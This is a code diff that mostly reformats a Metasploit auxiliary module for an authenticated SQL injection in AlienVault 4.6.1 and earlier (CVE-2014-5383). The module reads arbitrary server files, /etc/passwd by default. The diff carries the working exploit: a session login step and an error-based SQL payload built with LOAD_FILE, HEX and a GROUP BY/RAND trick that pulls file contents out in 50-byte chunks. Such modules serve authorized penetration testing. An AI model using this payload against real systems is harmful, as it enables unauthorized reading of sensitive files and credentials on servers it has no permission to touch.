@@ -6,46 +6,51 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "AlienVault Authenticated SQL Injection Arbitrary File Read",
-      'Description'    => %q{
-        AlienVault 4.6.1 and below is susceptible to an authenticated SQL injection attack against
-        newpolicyform.php, using the 'insertinto' parameter. This module exploits the vulnerability
-        to read an arbitrary file from the file system. Any authenticated user is able to exploit
-        this, as administrator privileges are not required.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "AlienVault Authenticated SQL Injection Arbitrary File Read",
+        'Description' => %q{
+          AlienVault 4.6.1 and below is susceptible to an authenticated SQL injection attack against
+          newpolicyform.php, using the 'insertinto' parameter. This module exploits the vulnerability
+          to read an arbitrary file from the file system. Any authenticated user is able to exploit
+          this, as administrator privileges are not required.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Chris Hebert <chrisdhebert[at]gmail.com>'
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2014-5383'],
           ['OSVDB', '106815'],
           ['EDB', '33317'],
           ['URL', 'http://forums.alienvault.com/discussion/2690/security-advisories-v4-6-1-and-lower']
         ],
-      'DefaultOptions'  =>
-        {
+        'DefaultOptions' => {
           'SSL' => true
         },
-      'Privileged'     => false,
-      'DisclosureDate' => '2014-05-09'))
+        'Privileged' => false,
+        'DisclosureDate' => '2014-05-09',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
-      register_options([
-        Opt::RPORT(443),
-        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
-        OptString.new('USERNAME', [ true, 'Single username' ]),
-        OptString.new('PASSWORD', [ true, 'Single password' ]),
-        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ]),
-        OptInt.new('SQLI_TIMEOUT', [ true, 'Specify the maximum time to exploit the sqli (in seconds)', 60])
-      ])
+    register_options([
+      Opt::RPORT(443),
+      OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
+      OptString.new('USERNAME', [ true, 'Single username' ]),
+      OptString.new('PASSWORD', [ true, 'Single password' ]),
+      OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ]),
+      OptInt.new('SQLI_TIMEOUT', [ true, 'Specify the maximum time to exploit the sqli (in seconds)', 60])
+    ])
   end
 
   def run
-
     print_status("Get a valid session cookie...")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
@@ -117,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
           full << str
           vprint_status(str)
 
-          i = i+1
+          i = i + 1
         end
       end
     rescue ::Timeout::Error
@@ -134,9 +139,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def sqli(left_marker, right_marker, sql_true, i, cookie, filename)
-    pay =  "X') AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
+    pay = "X') AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
     pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),"
-    pay << "0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
+    pay << "0x20)),#{(50 * i) + 1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
     pay << " GROUP BY x)a) AND ('0x#{sql_true.unpack("H*")[0]}'='0x#{sql_true.unpack("H*")[0]}"
 
     get = {
